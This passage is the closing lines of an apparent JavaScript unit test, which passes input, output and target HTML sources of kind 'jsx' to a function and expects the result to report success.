      inputSource: input,
      outputSource: output,
      targetOuterHtml: oldTarget,
      kind: "jsx",
    });
    expect(r.ok).toBe(true);
  });
});
